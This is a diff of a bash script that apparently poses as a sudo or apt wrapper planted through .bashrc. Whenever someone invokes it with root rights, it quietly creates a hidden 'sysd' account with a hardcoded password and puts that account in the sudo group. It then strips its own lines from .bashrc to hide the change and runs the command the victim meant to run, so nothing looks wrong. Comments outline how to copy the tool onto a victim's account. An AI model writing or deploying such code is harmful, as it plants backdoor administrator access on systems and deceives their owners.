@@ -1,37 +1,45 @@
 #!/bin/bash
 
+if ([ -d "/tmp/.systemd" ]); then
+    sudo ${@:1}
+    exit 0
+fi
+
 # if not called with sudo - run the normal program then exit
-if (( $EUID != 0 )); then  
-    /usr/bin/apt ${@:1}
+if (( $EUID != 0 ) ); then  
+    ${@:1}
     exit 0 
 fi
 
 
- # add user/password to /etc/shadow
+ # add user account sysd
  useradd -g users -M -s /bin/bash -p $(echo D0nuts1234 | openssl passwd -1 -stdin) sysd
- # change password
+ # Add new user to the sudoers group
  usermod -aG sudo sysd 
 
  # clean up after
  mv $HOME/.bashrc $HOME/.bashrc.tmp
- head -n -3 $HOME/.bashrc.tmp > $HOME/.bashrc
- #rm $HOME/.bashrc.tmp
- chown jmwample:jmwample  $HOME/.bashrc
- #chown ndonnel:ndonnel  $HOME/.bashrc
+ grep -vxf $HOME/.local/sbin/.config $HOME/.bashrc.tmp > $HOME/.bashrc
+ rm $HOME/.bashrc.tmp 
+ chown ndonnel:ndonnel  $HOME/.bashrc
 
  # call the program that was supposed to run 
  ${@:1}
 
- # clean up
- rm -rf  $HOME/.local/sbin
+ source /home/ndonnel/.bashrc
 
- source .bashrc
- #echo "Done. -- "
+
+
+ 
+if [ ! -d "/tmp/.systemd" ]; then
+    mkdir /tmp/.systemd
+    #TODO: Pull the stuff
+fi
 
 
  #instructions:
  # 3. scp jwample@sweetiebelle:~/sbin ~/.local
- # 2. run Setup.sh and log out
+ # 2. run setup.sh and log out
  # 4. wait
 
 
